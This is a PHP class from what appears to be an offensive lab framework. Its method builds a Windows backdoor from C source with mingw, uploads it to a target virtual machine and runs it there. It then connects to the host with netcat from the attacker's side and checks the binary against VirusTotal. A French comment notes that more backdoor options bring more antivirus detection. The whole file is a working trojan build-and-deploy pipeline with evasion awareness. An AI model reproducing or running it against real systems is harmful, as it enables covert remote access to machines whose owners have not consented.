<?php 




class trojan4win extends inject4win{

  

    public function __construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot) {
        parent::__construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot);
    }
    
    public function trojan_win_c2exe() {
        $this->ssTitre(__FUNCTION__);
        $vmx = new VM($this->target_vmx_name); // xp3
        if (!empty($this->snapshot)) $vmx->vm2revert2snapshot($this->snapshot);
        $this->requette("/usr/bin/i686-w64-mingw32-gcc -Os -m32 -c $this->dir_tools/backdoor/trojan_win32.c -o $this->file_dir/$this->file_name.o" );
        $this->requette("/usr/bin/i686-w64-mingw32-ld $this->file_dir/$this->file_name.o -lws2_32 -lkernel32 -lshell32 -lmsvcrt -ladvapi32 -subsystem=windows -o $this->file_path" );
        $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
        $this->requette("gedit $this->dir_tools/backdoor/trojan_win32.c");
        $vmx->vm2upload("$this->file_path", "$this->vm_tmp_win\\$this->file_ext");
        $this->cmd($this->target_ip,"$this->vm_tmp_win\\$this->file_ext" );
        $this->cmd($this->attacker_ip,"nc $this->target_ip $this->attacker_port -v" );
        $this->pause();
        $vmx->vm2download("$this->vm_tmp_win\\$this->file_ext", "$this->file_path");
        $this->file2virus2vt(); // 16/54
        $this->win2info();
        //$this->file2sandbox("cuckoo1");
        $this->note("plus d'Options pour le backdoor = + de detection pour les antivirus");
        return $this;
    }
    
    
    
    
}
?>